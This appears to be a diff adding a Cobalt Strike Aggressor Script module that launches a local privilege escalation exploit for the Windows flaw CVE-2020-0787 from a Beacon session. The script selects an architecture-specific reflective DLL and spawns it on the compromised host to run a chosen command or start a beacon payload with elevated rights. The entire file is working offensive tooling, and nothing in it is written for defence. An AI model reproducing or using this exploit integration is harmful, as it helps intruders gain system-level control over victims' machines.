@@ -1,0 +1,42 @@
+sub getnow {
+	return (formatDate("yyyy/MM/dd HH:mm:ss"));
+}
+sub CVE_2020_0787 {
+		$Dialog = dialog("CVE_2020_0787-Execute",%(program => "cmd.exe" , parameters => "/c whoami" , bid => $1 , listener => $2),lambda({
+			local('$program $parameters $Action $user $bid $arch $dll $cmdline');
+			$bid = $3['bid'];
+			$program = $3['program'];
+			$listener = $3['listener'];
+			$parameters = $3['parameters'];
+			$Action = $3['Action'];
+			blog($bid, "-------".getnow()."-------");
+			if($Action eq "Execute"){
+				$cmdline  = "1|".$program."|".$parameters. " \> \\\\\\\\.\\\\pipe\\\\8e8988b257e9dd2ea44ff03d44d26467b7c9ec16";
+			}else if($Action eq "Beacon"){
+				$cmdline  = "2|".$program."|".$parameters;
+			}
+
+			$cmdline = replace($cmdline,":\/",":\/\/");
+			blog($bid, "Run: \c4 $cmdline \o");
+			btask($bid, "Task Beacon to run " . listener_describe($listener) . " via CVE-2020-0787"); #KB4551762
+
+			if(binfo($bid, "arch") eq "x86"){
+				blog($bid,"Beacon Arch is x86");
+				$dll = getFileProper(script_resource("PrivilegeEscalation/ReflectionDLL/"), "CVE_2020_0787_x86.dll"); 
+			}else if (binfo($bid, "arch") eq "x64"){
+				blog($bid,"Beacon Arch is x64");
+				$dll = getFileProper(script_resource("PrivilegeEscalation/ReflectionDLL/"), "CVE_2020_0787_x64.dll"); 
+			}else{
+				berror($bid,"Not Found Arch!");
+				return;
+			}
+			bdllspawn!($bid, $dll,$cmdline, "Elevation of local privileges", 5000);
+		},$1 => $1 ));
+		dialog_description($Dialog, "Execute：Result for command；Beacon：No Result,Just Run File like C://beacon.exe C:\\\\\\\\beacon.exe");
+		drow_text($Dialog, "program", "Program:");
+		drow_text($Dialog, "parameters", "Parameters:");
+		drow_combobox($Dialog, "Action", "Action: ", @("Execute","Beacon"));
+		dbutton_action($Dialog, "Execute");
+		dialog_show($Dialog);
+	}
+beacon_exploit_register("CVE_2020_0787", "CVE_2020_0787", &CVE_2020_0787);
